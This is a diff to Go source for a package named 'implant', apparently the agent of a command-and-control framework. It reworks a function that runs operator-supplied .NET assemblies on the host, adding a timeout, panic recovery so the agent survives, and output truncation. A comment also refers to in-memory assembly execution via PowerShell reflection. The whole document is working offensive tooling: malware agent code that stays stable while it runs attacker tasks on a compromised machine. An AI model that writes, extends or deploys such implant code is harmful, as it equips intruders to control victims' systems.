@@ -1,6 +1,8 @@
 package implant
 
 import (
+	"bytes"
+	"context"
 	"encoding/base64"
 	"fmt"
 	"os"
@@ -8,6 +10,7 @@ import (
 	"path/filepath"
 	"runtime"
 	"strings"
+	"time"
 )
 
 // ══════════════════════════════════════════
@@ -104,22 +107,57 @@ Usage:
 	return nil, fmt.Errorf("provide assembly path, inline base64, or upload assembly data")
 }
 
-// Execute .NET assembly from file
-func executeAssemblyFromFile(path string, args []string) ([]byte, error) {
-	// Direct execution — run the .exe with arguments
-	cmd := exec.Command(path, args...)
+// Execute .NET assembly from file with timeout and crash protection
+func executeAssemblyFromFile(path string, args []string) (result []byte, retErr error) {
+	// Recover from any panic to prevent agent crash
+	defer func() {
+		if r := recover(); r != nil {
+			result = []byte(fmt.Sprintf("[-] Assembly execution panicked: %v", r))
+			retErr = fmt.Errorf("panic: %v", r)
+		}
+	}()
+
+	// Run with 120 second timeout
+	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
+	defer cancel()
+
+	cmd := exec.CommandContext(ctx, path, args...)
 	cmd.Env = os.Environ()
-	out, err := cmd.CombinedOutput()
+
+	var stdout, stderr bytes.Buffer
+	cmd.Stdout = &stdout
+	cmd.Stderr = &stderr
+
+	err := cmd.Run()
+
+	// Combine output
+	out := stdout.Bytes()
+	if stderr.Len() > 0 {
+		if len(out) > 0 {
+			out = append(out, '\n')
+		}
+		out = append(out, stderr.Bytes()...)
+	}
+
+	// Truncate if too large (>500KB output)
+	if len(out) > 500*1024 {
+		out = append(out[:500*1024], []byte("\n\n[!] Output truncated (500KB limit)")...)
+	}
 
 	if len(out) > 0 {
-		return append([]byte(fmt.Sprintf("[+] Assembly executed: %s %s\n\n", filepath.Base(path), strings.Join(args, " "))), out...), nil
+		header := fmt.Sprintf("[+] Assembly executed: %s %s\n\n", filepath.Base(path), strings.Join(args, " "))
+		return append([]byte(header), out...), nil
+	}
+
+	if ctx.Err() == context.DeadlineExceeded {
+		return []byte(fmt.Sprintf("[-] Assembly timed out after 120s: %s", filepath.Base(path))), nil
 	}
 
 	if err != nil {
-		return []byte(fmt.Sprintf("[-] Assembly execution failed: %v\n[*] Try running manually: %s %s", err, path, strings.Join(args, " "))), err
+		return []byte(fmt.Sprintf("[-] Assembly failed: %v\n[*] Try: shell %s %s", err, path, strings.Join(args, " "))), nil
 	}
 
-	return []byte("[*] Assembly executed but produced no output"), nil
+	return []byte("[*] Assembly executed — no output"), nil
 }
 
 // Execute .NET assembly in-memory via PowerShell reflection
